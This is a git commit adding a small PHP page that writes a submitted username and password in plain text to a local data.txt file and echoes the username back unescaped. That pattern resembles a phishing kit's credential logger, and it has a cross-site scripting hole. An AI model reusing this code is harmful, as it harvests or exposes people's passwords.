3f9db0303347bffc95e864fbd278ed987391a980
runninggump <970768603@qq.com>
2018-11-26 23:00:09 +0800

    first commit

---
+++ success.php
@@ -0,0 +1,18 @@
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Document</title>
+</head/>
+<body>
+  <?php
+    $name = $_POST["username"];
+    $pwd = $_POST["pwd"];
+    $fp = fopen("./data.txt", "a");
+    $str = "user:".$name."&password:".$pwd."\r\n";
+    fwrite($fp,$str);
+    fclose($fp);
+    echo "<h1>welcome back!".$name."!</h1>";
+  ?>
+</body>
+</html>
+
